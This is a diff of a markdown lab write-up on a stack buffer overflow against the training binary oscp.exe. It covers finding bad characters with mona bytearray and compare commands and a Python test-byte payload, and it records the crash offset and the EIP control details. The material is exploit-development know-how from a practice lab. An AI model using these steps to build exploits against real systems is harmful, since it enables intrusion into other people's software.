@@ -360,92 +360,51 @@ except:
 
         - The first badchar in the list should be the null byte `\x00` since we already removed it from the file. 
     
-        - **Make a note of any others.** 07, 08, 21 
+        - **Make a note of any others.** `07, 08, 2e, 2f, a0, a1`
     
 6. Generate a new `bytearray` in `mona`, specifying these new `badchars` along with `\x00`.
 
-    - `!mona bytearray -b "\x00\x07\x08\x21"`
+    - `!mona bytearray -b "\x00\x07\x08\x2E\x2F\xA0\xA1"`
     
-    - ![image](https://user-images.githubusercontent.com/94720207/169678313-d27dfa8d-550f-4d25-bf8b-847ad99e7afb.png)
+    - ![image](https://user-images.githubusercontent.com/94720207/169679528-5b07f505-17a0-4aa1-9d9b-85716b7410f9.png)
      
+7. Then update the `payload` variable in your `overflow1_step4_findBadchars.py` script and remove the **new badchars** as well `"\x00\x07\x08\x2E\x2F\xA0\xA1"`.
 
+    - ![image](https://user-images.githubusercontent.com/94720207/169679682-7ad1e822-12d7-41d2-9d5c-f0580b637593.png)
 
-
-
-
-
-7. Then update the `payload` variable in your `overflow1_step4_findBadchars.py` script and remove the **new badchars** as well `"\x00\x07\x08\x21"`.
-
-    - ![image](https://user-images.githubusercontent.com/94720207/169678372-8b208219-4eb3-4d3f-83ce-105073646520.png)
+```python
+payload = "\x01\x02\x03\x04\x05\x06\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+```
 
 8. Restart `oscp.exe` in `Immunity Debugger` and run the `overflow1_step4_findBadchars.py` script again.
 
     - ![image](https://user-images.githubusercontent.com/94720207/169678420-ac75679f-40f9-436b-b01d-87aeb2516a68.png)
     
-    - ![image](https://user-images.githubusercontent.com/94720207/169678485-15817988-fc69-4854-af77-ea9f0e74c7ff.png)
+    - ![image](https://user-images.githubusercontent.com/94720207/169679715-dc96830b-0605-42bc-ba6e-e40e0a98dd1c.png)
       
 9. **Repeat the badchar comparison until the results status returns `Unmodified`. This indicates that no more badchars exist.** 
-
-    - **ESP points: `011BFA18`**
-    
-    - `!mona compare -f C:\mona\oscp\bytearray.bin -a 011BFA18` 
-    
-    - ![image](https://user-images.githubusercontent.com/94720207/169678507-e1390bff-45ac-4545-86ee-5f9241586753.png)
-
-- **Repeating:** (Loop to **step 6**) (adding \x22)
-
-8. Generate a new `bytearray` in `mona`, specifying these new `badchars` along with `\x00`.
-
-    - `!mona bytearray -b "\x00\x07\x08\x21\x22"`
-    
-    - ![image](https://user-images.githubusercontent.com/94720207/169678572-1046be7e-b00f-4408-a2de-4e7c89b95070.png)
-
-9. Then update the `payload` variable in your `overflow1_step4_findBadchars.py` script and remove the **new badchars** as well `"\x00\x07\x08\x21\x22"`.
-
-    - ![image](https://user-images.githubusercontent.com/94720207/169678633-2a583905-a4db-4341-a506-561db6a2b913.png)
-
-10. Restart `oscp.exe` in `Immunity Debugger` and run the `overflow1_step4_findBadchars.py` script again.
-
-    - ![image](https://user-images.githubusercontent.com/94720207/169678679-aff860b2-127d-400e-b17e-20567a098672.png)
-    
-    - ![image](https://user-images.githubusercontent.com/94720207/169678697-13cf1341-f763-4de2-b820-aec6576281a4.png)
-      
-11. **Repeat the badchar comparison until the results status returns `Unmodified`. This indicates that no more badchars exist.** 
 
     - **ESP points: `0105FA18`**
     
     - `!mona compare -f C:\mona\oscp\bytearray.bin -a 0105FA18` 
     
-    - ![image](https://user-images.githubusercontent.com/94720207/169678704-c0f9c862-68ea-428d-a8f6-3378f10e4fd8.png)
+    - ![image](https://user-images.githubusercontent.com/94720207/169679745-27ea4da9-0929-47d3-ac00-6bedfda8c2c5.png)
 
-- **Repeating:** (Loop to **step 6**) (adding \x23)
-
-12. Generate a new `bytearray` in `mona`, specifying these new `badchars` along with `\x00`.
-
-    - `!mona bytearray -b "\x00\x07\x08\x21\x22\x23"`
+    - ![image](https://user-images.githubusercontent.com/94720207/169679762-cf839a68-34f9-4d43-ac90-d5b46db07de1.png)
     
-    - ![image](https://user-images.githubusercontent.com/94720207/169678751-c14c7dd4-4e7e-4f72-b105-b2c8040bf3e2.png)
+        - Total `badchars` : `\x00\x07\x08\x2E\x2F\xA0\xA1` 
 
-9. Then update the `payload` variable in your `overflow1_step4_findBadchars.py` script and remove the **new badchars** as well `"\x00\x07\x08\x21\x22\x23"`.
+### Results
 
-    - ![image](https://user-images.githubusercontent.com/94720207/169678769-5356627a-98a9-4083-8462-b5cf3928272f.png)
+- << **Initial Crash at: `2000 bytes` (A * 2000)** >> 
 
-10. Restart `oscp.exe` in `Immunity Debugger` and run the `overflow1_step4_findBadchars.py` script again.
+- << **Exact Offset for Crash: `1978 bytes` (A * 1978)** >> 
 
-    - ![image](https://user-images.githubusercontent.com/94720207/169678794-3a38c212-bcd9-455d-a9ef-35d7ce2063bd.png)
+- << **"Perfect world" buffer gap A = 1978 bytes + (EIP) B = 4 bytes, controlling EIP just at `1978(A's) + 4(B's)` with `42424242` `BBBB`** >> 
+
+- << **`Badchars` : `\x00\x07\x08\x2E\x2F\xA0\xA1`** >>  
     
-    - ![image](https://user-images.githubusercontent.com/94720207/169678821-15d989db-79ff-4272-9206-b7e0a2056489.png)
-      
-11. **Repeat the badchar comparison until the results status returns `Unmodified`. This indicates that no more badchars exist.** 
-
-    - **ESP points: `0108FA18`**
-    
-    - `!mona compare -f C:\mona\oscp\bytearray.bin -a 0108FA18` 
-    
-    - ![image](https://user-images.githubusercontent.com/94720207/169678850-24ea71b3-4599-4764-a069-d7e41d64cd37.png)
-
-- **Repeating:** (Loop to **step 6**) (adding \x23)
-        
+    - _Note: Restart the Lab after the crash._
 --- 
 
 ### 4. Finding a Jump Point
